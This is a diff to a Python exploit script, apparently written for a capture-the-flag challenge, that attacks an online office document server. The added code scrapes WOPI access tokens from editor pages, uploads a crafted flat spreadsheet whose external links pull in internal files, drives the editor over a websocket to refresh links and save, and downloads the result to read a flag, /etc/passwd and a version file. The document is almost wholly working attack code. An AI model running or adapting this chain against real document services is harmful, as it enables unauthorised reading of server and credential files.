@@ -9,6 +9,9 @@ import urllib.parse
 import urllib.request
 import uuid
 import zipfile
+import time
+
+import websocket
 
 BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
 EMAIL = "arena-93aa1301@corp"
@@ -101,27 +104,121 @@ def make_fods(sources):
 </office:spreadsheet></office:body></office:document>'''.encode()
 
 
-def convert(data):
-    boundary = "----Arena" + uuid.uuid4().hex
-    body = (f'--{boundary}\r\nContent-Disposition: form-data; name="data"; filename="probe.fods"\r\nContent-Type: application/octet-stream\r\n\r\n'.encode() + data + f"\r\n--{boundary}--\r\n".encode())
-    status, _, raw, _ = req(
-        "/cool/convert-to/csv", "POST", body,
-        {"Content-Type": "multipart/form-data; boundary=" + boundary}, limit=5000000,
+def editor_token(docid):
+    _, _, editor, _ = req("/edit/" + docid)
+    match = re.search(rb'<iframe[^>]+src=["\']([^"\']+)', editor)
+    if not match:
+        raise RuntimeError("No editor token for " + docid)
+    iframe = html.unescape(match.group(1).decode())
+    return urllib.parse.parse_qs(urllib.parse.urlsplit(iframe).query)["access_token"][0]
+
+
+def source_url(docid):
+    token = editor_token(docid)
+    query = "?access_token=" + urllib.parse.quote(token, safe="")
+    return "http://webapp:8000/wopi/files/" + docid + "/contents" + query
+
+
+def create_payload(title, data):
+    _, final, _, _ = req("/docs/create", "POST", form={"folder": "", "title": title})
+    docid = urllib.parse.urlsplit(final).path.rsplit("/", 1)[-1]
+    token = editor_token(docid)
+    query = "?access_token=" + urllib.parse.quote(token, safe="")
+    status, _, body, _ = req(
+        "/wopi/files/" + docid + "/contents" + query,
+        "POST", data,
+        {"Content-Type": "application/octet-stream", "X-WOPI-Override": "PUT"},
     )
-    print("\n=== FINAL_CSV STATUS", status, "===\n" + raw.decode("utf-8", "replace"), flush=True)
+    print("PAYLOAD", title, "DOCID", docid, "PUT_STATUS", status, "PUT_BODY", body.decode("utf-8", "replace"), flush=True)
+    return docid, token, query
+
+
+def recv_for(ws, seconds, stop_on_save=False):
+    deadline = time.monotonic() + seconds
+    loaded = False
+    saved = False
+    while time.monotonic() < deadline:
+        try:
+            ws.settimeout(max(0.2, min(1.0, deadline - time.monotonic())))
+            msg = ws.recv()
+        except websocket.WebSocketTimeoutException:
+            continue
+        if isinstance(msg, bytes):
+            print("WS_BINARY", len(msg), flush=True)
+            continue
+        print("WS", msg[:1200], flush=True)
+        if msg.startswith("status:"):
+            loaded = True
+            if not stop_on_save:
+                break
+        if stop_on_save and ".uno:Save" in msg and ("success" in msg or "unocommandresult" in msg):
+            saved = True
+            # Keep draining briefly: the local save response precedes WOPI upload.
+            deadline = min(deadline, time.monotonic() + 4)
+        if msg.startswith("error:"):
+            break
+    return loaded, saved
+
+
+def open_wait_save(docid, token):
+    wopi_src = "http://webapp:8000/wopi/files/" + docid
+    params = urllib.parse.urlencode({
+        "WOPISrc": wopi_src,
+        "access_token": token,
+        "permission": "edit",
+        "compat": "",
+    })
+    ws_url = BASE.replace("http://", "ws://", 1) + "/cool/ws?" + params
+    cookies = "; ".join(c.name + "=" + c.value for c in jar)
+    print("WS_CONNECT", ws_url, flush=True)
+    ws = websocket.create_connection(ws_url, timeout=30, origin=BASE, cookie=cookies)
+    try:
+        now = int(time.time() * 1000)
+        ws.send(f"coolclient 0.1 {now} 1")
+        encoded_src = urllib.parse.quote(wopi_src, safe="-_.!~*'()")
+        ws.send("load url=" + encoded_src + " timezone=Europe/Moscow")
+        loaded, _ = recv_for(ws, 90)
+        print("WS_LOADED", loaded, flush=True)
+        if not loaded:
+            return False
+        # This is harmless on the vulnerable target and also exercises deferred
+        # sources if a downstream build happens to have the later link gate.
+        ws.send("allowlinkupdate")
+        recv_for(ws, 6)
+        ws.send("save")
+        _, saved = recv_for(ws, 18, stop_on_save=True)
+        print("WS_SAVE_RESPONSE", saved, flush=True)
+        return saved
+    finally:
+        ws.close()
+
+
+def print_saved(docid, query):
+    # Let the WOPI upload finish after the kit's local .uno:Save response.
+    time.sleep(3)
+    status, _, raw, _ = req("/wopi/files/" + docid + "/contents" + query, limit=10000000)
+    print("SAVED_DOWNLOAD_STATUS", status, "BYTES", len(raw), flush=True)
+    if raw.startswith(b"PK"):
+        with zipfile.ZipFile(io.BytesIO(raw)) as z:
+            for name in ("content.xml", "mimetype"):
+                if name in z.namelist():
+                    data = z.read(name)
+                    print("\n=== SAVED_" + name + " ===\n" + data.decode("utf-8", "replace"), flush=True)
+    else:
+        print("\n=== SAVED_DOCUMENT ===\n" + raw.decode("utf-8", "replace"), flush=True)
 
 
 def main():
     req("/login", "POST", form={"email": EMAIL, "password": PASSWORD})
-    root = host_odb("root-flat", "/")
-    etc = host_odb("etc-flat", "/etc")
-    lo = host_odb("lo-flat", "/lo/program")
+    # d4/d5/d6 are the ODB documents uploaded by the previous probe.
     sources = [
-        (root, "flag", "Sheet1.A1:Sheet1.A20"),
-        (etc, "passwd", "Sheet1.C1:Sheet1.C60"),
-        (lo, "versionrc", "Sheet1.E1:Sheet1.E20"),
+        (source_url("d4"), "flag", "Sheet1.A1:Sheet1.A20"),
+        (source_url("d5"), "passwd", "Sheet1.C1:Sheet1.C60"),
+        (source_url("d6"), "versionrc", "Sheet1.E1:Sheet1.E20"),
     ]
-    convert(make_fods(sources))
+    docid, token, query = create_payload("refresh.fods", make_fods(sources))
+    open_wait_save(docid, token)
+    print_saved(docid, query)
 
 
 if __name__ == "__main__":
